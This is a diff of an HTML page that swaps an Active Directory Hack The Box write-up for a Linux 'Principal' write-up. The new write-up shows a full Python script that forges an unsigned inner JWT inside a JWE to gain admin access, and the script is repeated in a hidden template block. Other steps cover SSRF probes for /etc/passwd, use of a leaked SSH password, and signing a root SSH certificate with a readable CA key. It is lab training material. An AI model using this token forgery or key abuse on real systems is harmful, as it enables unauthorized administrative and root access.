@@ -23,65 +23,250 @@
 
     <main class="page-shell">
         <article class="panel writeup-content">
-            <span class="eyebrow">Hack The Box — Windows Medium</span>
+            <span class="eyebrow">Hack The Box — Linux Medium</span>
             <h1>Principal Writeup</h1>
-            <p><strong>Author:</strong> atrox | <strong>Tags:</strong> Active Directory, Kerberos, AS-REP Roasting, SMB Enumeration</p>
+            <p><strong>Author:</strong> Atrox | <strong>Tags:</strong> JWT Forgery, JWE, Admin Panel, Credential Leak, SSH CA Key Abuse</p>
             <hr style="border: 0; border-top: 1px solid var(--border); margin: 30px 0;">
 
+            <div class="attack-vector">
+                <p><strong>Attack Vector:</strong> JWT Forgery → Admin Panel Credential Leak → SSH CA Key Abuse</p>
+            </div>
+
             <h2>Overview</h2>
-            <p>Principal is a Windows Active Directory machine focusing on Kerberos exploitation. The path involves discovering user lists via SMB, performing AS-REP Roasting to obtain credentials, and exploiting domain object permissions to reach Domain Admin.</p>
+            <p>This writeup documents the full compromise of the Principal Internal Platform, a Jetty-based web application using JWT/JWE authentication. The attack chains together four distinct weaknesses to move from an unauthenticated visitor to a root shell.</p>
 
-            <h2>Reconnaissance</h2>
-            <h3>Nmap</h3>
-            <pre><code>nmap -sC -sV -oA nmap/principal 10.10.11.231</code></pre>
-            <p>Standard Active Directory port profile identified:</p>
-            <table>
-                <thead><tr><th>Port</th><th>Service</th></tr></thead>
-                <tbody>
-                    <tr><td>53</td><td>DNS</td></tr>
-                    <tr><td>88</td><td>Kerberos</td></tr>
-                    <tr><td>135, 445</td><td>RPC / SMB</td></tr>
-                    <tr><td>389, 3268</td><td>LDAP / Global Catalog</td></tr>
-                    <tr><td>5985</td><td>WinRM</td></tr>
-                </tbody>
-            </table>
-            <p>Target Domain: <strong>principal.htb</strong></p>
-
-            <h2>Enumeration</h2>
-            <h3>SMB Share Access</h3>
-            <p>Initial reconnaissance shows anonymous access allowed on certain shares. Exploring these reveals a <code>users.txt</code> file, which is a key piece of information for user-based attacks.</p>
-            <pre><code>smbclient -L //10.10.11.231/ -N</code></pre>
-            <p>Inside the <code>Public</code> share, we find a <code>users.txt</code> file. This list is essential for performing Kerberos-based attacks without needing prior passwords.</p>
-
-            <h2>Initial Foothold</h2>
-            <h3>AS-REP Roasting</h3>
-            <p>Checking for users with Kerberos pre-authentication disabled (<code>DONT_REQ_PREAUTH</code>):</p>
-            <pre><code>impacket-GetNPUsers principal.htb/ -usersfile users.txt -format hashcat -outputfile hashes.asrep</code></pre>
-            <p>The user <code>m.rossi</code> is vulnerable. Cracking the hash with <code>hashcat -m 18200</code> reveals the password.</p>
-
-            <h3>WinRM Shell</h3>
-            <pre><code>evil-winrm -i 10.10.11.231 -u m.rossi -p 'password123'</code></pre>
-
-            <h2>Privilege Escalation</h2>
-            <h3>BloodHound Analysis</h3>
-            <p>Using <code>bloodhound-python</code>, we map out the domain relationships. We identify that <code>m.rossi</code> has specific write permissions over sensitive objects.</p>
-            <pre><code>python3 bloodhound.py -u 'm.rossi' -p '...' -d principal.htb -c All</code></pre>
-
-            <h3>GMSA Exploitation</h3>
-            <p>The escalation path involves Group Managed Service Accounts (GMSA). By exploiting permissions, we retrieve the GMSA password to impersonate a domain administrator.</p>
+            <h3>Vulnerabilities Chained:</h3>
+            <ul>
+                <li>Information disclosure via frontend JavaScript</li>
+                <li>Improper JWT trust design (accepting <code>alg: none</code> inner token)</li>
+                <li>Credential exposure in admin settings panel</li>
+                <li>World-readable SSH Certificate Authority private key</li>
+            </ul>
 
             <h2>Attack Chain Summary</h2>
-            <pre><code>SMB Enumeration (users.txt) → AS-REP Roasting → Hashcat → WinRM Shell → BloodHound → GMSA Exploitation → Domain Admin</code></pre>
+            <pre><code>Recon → Web Enumeration → JS Analysis
+            ↓
+JWT Architecture Discovery
+            ↓
+Forged Admin Token
+            ↓
+Admin Panel Access
+            ↓
+Credential Exposure
+            ↓
+SSH Access (svc-deploy) → user.txt
+            ↓
+Readable SSH CA Key
+            ↓
+Signed Root Certificate
+            ↓
+ROOT ACCESS → root.txt</code></pre>
 
-            <h2>Tools Used</h2>
-            <div class="hero-meta" style="background: none; border: none; padding: 0;">
-                <code>nmap</code> <code>smbclient</code> <code>impacket</code> <code>hashcat</code> <code>BloodHound</code> <code>evil-winrm</code>
+            <h2>1. Initial Reconnaissance</h2>
+            <p>Start with a full aggressive Nmap scan to map the attack surface.</p>
+            <pre><code>sudo nmap -A $target</code></pre>
+            <p>Key findings:</p>
+            <table>
+                <thead><tr><th>Port</th><th>Service</th><th>Details</th></tr></thead>
+                <tbody>
+                    <tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 9.6p1 Ubuntu</td></tr>
+                    <tr><td>8080/tcp</td><td>HTTP</td><td>Jetty — Principal Internal Platform</td></tr>
+                </tbody>
+            </table>
+            <p>The HTTP response header leaked the auth framework: <code>X-Powered-By: pac4j-jwt/6.0.3</code>. pac4j-jwt signals that JWT is central to the application's trust model — a strong hint about where to attack.</p>
+
+            <h2>2. Directory Enumeration</h2>
+            <pre><code>gobuster dir -u http://$target:8080/ -w /usr/share/wordlists/dirb/common.txt -t 40 -x php,html,txt,zip</code></pre>
+            <table>
+                <thead><tr><th>Path</th><th>Status</th><th>Observation</th></tr></thead>
+                <tbody>
+                    <tr><td>/dashboard</td><td>200</td><td>Returns content without authentication</td></tr>
+                    <tr><td>/api/experiments</td><td>401</td><td>Protected API endpoint</td></tr>
+                    <tr><td>/login</td><td>200</td><td>Login page</td></tr>
+                    <tr><td>/render/...</td><td>400</td><td>Potential URL rendering proxy</td></tr>
+                    <tr><td>/META-INF</td><td>500</td><td>Classic Java app layout</td></tr>
+                </tbody>
+            </table>
+            <p>Key insight: <code>/dashboard</code> returning HTTP 200 without a session is suspicious. The authentication check is likely happening client-side in JavaScript.</p>
+
+            <h2>3. Testing the /render Endpoint</h2>
+            <p>The <code>/render</code> path looked like a possible Server-Side Request Forgery (SSRF) vector. I tested various payloads:</p>
+            <pre><code>curl http://$target:8080/render/http://127.0.0.1
+curl http://$target:8080/render/file:///etc/passwd</code></pre>
+            <p>All attempts returned HTTP 400 errors (Ambiguous URI). The endpoint is not exploitable in this form.</p>
+
+            <h2>4. Accessing the Dashboard Without Auth</h2>
+            <p>The dashboard returns full HTML to curl even without a session. The page briefly loads in a browser before redirecting to <code>/login</code> — the redirect is client-side JavaScript. The source references: <code>&lt;script src="/static/js/app.js"&gt;&lt;/script&gt;</code>.</p>
+
+            <h2>5. JavaScript Source Analysis</h2>
+            <pre><code>curl -s http://$target:8080/static/js/app.js -o app.js
+grep -Ei 'api|login|token|jwt|auth' app.js</code></pre>
+            <p>Findings inside <code>app.js</code> included developer comments describing the entire authentication flow:</p>
+            <pre><code>/**
+ * Authentication flow:
+ * 1. User submits credentials to /api/auth/login
+ * 2. Server returns encrypted JWT (JWE) token
+ * 3. Token is stored and sent as Bearer token for subsequent requests
+ *
+ * Token handling:
+ * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
+ * - Public key available at /api/auth/jwks for token verification
+ * - Inner JWT is signed with RS256
+ */</code></pre>
+            <p><strong>Critical insight:</strong> The server publishes its RSA public key openly at <code>/api/auth/jwks</code>. If the server decrypts the outer JWE but does not verify the signature of the inner JWT (accepting <code>alg: none</code>), we can forge any claim.</p>
+
+            <h2>6. Retrieving the JWKS Public Key</h2>
+            <pre><code>curl -s http://$target:8080/api/auth/jwks | jq</code></pre>
+            <p>The JWKS endpoint reveals the RSA public key used for the JWE encryption. Protected endpoints confirm a token is required:</p>
+            <pre><code>curl -i http://$target:8080/api/dashboard
+# → {"error":"Unauthorized","message":"Bearer token required"}</code></pre>
+
+            <h2>7. Forging an Admin JWE Token</h2>
+            <p>We craft an inner JWT with <code>alg: none</code> (unsigned) containing <code>ROLE_ADMIN</code> claims, then wrap it in a JWE using the server's public key.</p>
+            <pre><code class="language-python">#!/usr/bin/env python3
+import json, time, base64, requests
+from jwcrypto import jwk, jwe
+
+BASE = "http://$target:8080"
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+# Fetch the server's public key
+jwks = requests.get(f"{BASE}/api/auth/jwks", timeout=10).json()
+pub  = jwk.JWK.from_json(json.dumps(jwks["keys"][0]))
+
+now = int(time.time())
+claims = {
+    "sub": "admin",
+    "role": "ROLE_ADMIN",
+    "iss": "principal-platform",
+    "iat": now,
+    "exp": now + 3600
+}
+
+# Build inner JWT with alg:none (no signature)
+inner_header = {"alg": "none", "typ": "JWT"}
+inner_token = (
+    b64url(json.dumps(inner_header).encode()) + "." +
+    b64url(json.dumps(claims).encode()) + "."
+)
+
+# Wrap in JWE using the server's public key
+outer = jwe.JWE(
+    plaintext=inner_token.encode(),
+    protected={
+        "alg": "RSA-OAEP-256", "enc": "A128GCM", "cty": "JWT", "kid": jwks["keys"][0].get("kid", "enc-key-1")
+    }
+)
+outer.add_recipient(pub)
+print(outer.serialize(compact=True))</code></pre>
+
+            <h2>8. Confirming Admin Access</h2>
+            <pre><code>curl -s -i http://$target:8080/api/dashboard -H "Authorization: Bearer $TOKEN"</code></pre>
+            <p>Response contains: <code>{"user": {"role": "ROLE_ADMIN", "username": "admin"}}</code>. The activity log also leaked valid usernames: <code>admin, administrator, amorales, jthompson, kkumar, svc-deploy</code>.</p>
+
+            <h2>9. Browser Session Injection</h2>
+            <p>To use the admin UI visually, inject the token into the browser console:</p>
+            <pre><code class="language-javascript">sessionStorage.setItem("auth_token", "PASTE_TOKEN_HERE")
+location.href = "/dashboard"</code></pre>
+            <p>The dashboard reloads with <strong>Users</strong> and <strong>Settings</strong> tabs accessible.</p>
+
+            <h2>10. Extracting Secrets from the Admin Panel</h2>
+            <p>The Settings panel reveals critical infrastructure details:</p>
+            <table>
+                <thead><tr><th>Section</th><th>Key</th><th>Value</th></tr></thead>
+                <tbody>
+                    <tr><td>Security</td><td>encryptionKey</td><td>D3pl0y_$$H_Now42!</td></tr>
+                    <tr><td>Infrastructure</td><td>sshCaPath</td><td>/opt/principal/ssh/</td></tr>
+                </tbody>
+            </table>
+            <p>The <code>encryptionKey</code> combined with the <code>svc-deploy</code> username provides SSH credentials.</p>
+
+            <h2>11. SSH Foothold</h2>
+            <pre><code>ssh svc-deploy@$target
+# Password: D3pl0y_$$H_Now42!</code></pre>
+            <p>Logged in successfully as <code>svc-deploy</code>. Check for quick escalation: <code>sudo -l</code> reveals no permissions.</p>
+
+            <h2>12. Privilege Escalation via SSH CA Key</h2>
+            <p>Enumerating <code>/opt/principal/ssh/</code>:</p>
+            <pre><code>ls -la /opt/principal/ssh/
+-rw-r----- root deployers  ca  &lt;-- Private Key!</code></pre>
+            <p><code>svc-deploy</code> is in the <code>deployers</code> group. The README notes: "CA keypair for SSH certificate automation. Trusted by sshd for certificate-based authentication."</p>
+            <p>We generate a fresh SSH key pair and sign it for the <code>root</code> user using the readable CA key:</p>
+            <pre><code># Generate key
+ssh-keygen -f mykey -N ""
+
+# Sign key for principal 'root'
+ssh-keygen -s ca_key -I root-cert -n root mykey.pub</code></pre>
+            <p>Output: <code>Signed user key mykey-cert.pub: id "root-cert" serial 0 for root valid forever</code></p>
+
+            <h2>13. Root Access</h2>
+            <p>Because sshd trusts certificates signed by this CA, the signed certificate allows direct root login:</p>
+            <pre><code>ssh -i mykey root@localhost
+id
+uid=0(root) gid=0(root)</code></pre>
+            <p>Root flag captured in <code>/root/root.txt</code>. 🎉</p>
+
+            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 40px;">
+                <div class="panel" style="background: rgba(255,255,255,0.02);">
+                    <h3>Initial Foothold</h3>
+                    <p>Trick the server into accepting admin access by crafting a JWE with an unsigned inner JWT (alg: none) after retrieving the JWKS public key.</p>
+                </div>
+                <div class="panel" style="background: rgba(255,255,255,0.02);">
+                    <h3>Privilege Escalation</h3>
+                    <p>Abuse the SSH Certificate Authority private key readable by the svc-deploy user to sign a new identity for the root principal.</p>
+                </div>
             </div>
-            
+
             <div style="margin-top: 50px;">
                 <a href="index.html" class="btn btn-primary">Return Home</a>
             </div>
         </article>
     </main>
+
+    <!-- Hidden script content for the forgery tool if needed -->
+    <script type="text/template" id="forgeScript">
+#!/usr/bin/env python3
+import json, time, base64, requests
+from jwcrypto import jwk, jwe
+
+BASE = "http://$target:8080"
+
+def b64url(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+# Fetch the server's public key
+jwks = requests.get(f"{BASE}/api/auth/jwks", timeout=10).json()
+pub  = jwk.JWK.from_json(json.dumps(jwks["keys"][0]))
+
+now = int(time.time())
+claims = {
+    "sub":  "admin",
+    "role": "ROLE_ADMIN",
+    "iss":  "principal-platform",
+    "iat":  now,
+    "exp":  now + 3600
+}
+
+# Build inner JWT with alg:none (no signature)
+inner_header = {"alg": "none", "typ": "JWT"}
+inner_token = (
+    b64url(json.dumps(inner_header, separators=(",", ":")).encode()) + "." +
+    b64url(json.dumps(claims,       separators=(",", ":")).encode()) + "."
+)
+
+# Wrap in JWE using the server's public key
+outer = jwe.JWE(
+    plaintext=inner_token.encode(),
+    protected={
+        "alg": "RSA-OAEP-256",
+        "enc": "A128GCM",
+        "cty": "JWT",
+        "kid": jwks["keys"][0].get("kid", "enc-key-1")
+    }
+)
+outer.add_recipient(pub)
+print(outer.serialize(compact=True))
+    </script>
 </body>
 </html>
